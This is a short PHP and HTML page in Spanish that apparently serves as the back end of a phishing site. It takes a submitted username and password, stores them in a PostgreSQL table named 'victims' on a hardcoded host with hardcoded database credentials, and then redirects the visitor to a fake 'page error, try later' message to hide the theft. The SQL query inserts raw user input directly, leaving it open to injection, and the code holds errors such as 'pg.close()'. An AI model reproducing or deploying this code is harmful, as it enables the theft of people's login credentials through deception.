<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error de página</title>
    <link rel="stylesheet" href="css/styles.css"></link>
</head>
<body>
<?php
    $dbconection = pg_connect("host=192.168.100.193 port=25000 dbname=DB_Proyecto user=DB_Proyecto password=DB_Proyecto");       

    $id = 0;
    $usuario = $_POST["user"];
    $contrasena = $_POST["pass"];

    $id = $id + 1 ;
    $query = ("INSERT INTO victims (Id, Username, Password) VALUES ($id, $usuario, $contrasena)");

    $registro = pg_query($dbconection, $query);

    pg.close();

    header('Location: error.html');
?>    
<div class="error_html">
    <ul>
        <li>
            <a><img src="images/error-page.png" width="150" height="150"></a>
        </li>
        <li>
            <a>Error en la página, intente más tarde</a>
        </li>
    </ul>
</div>
</body>
</html>
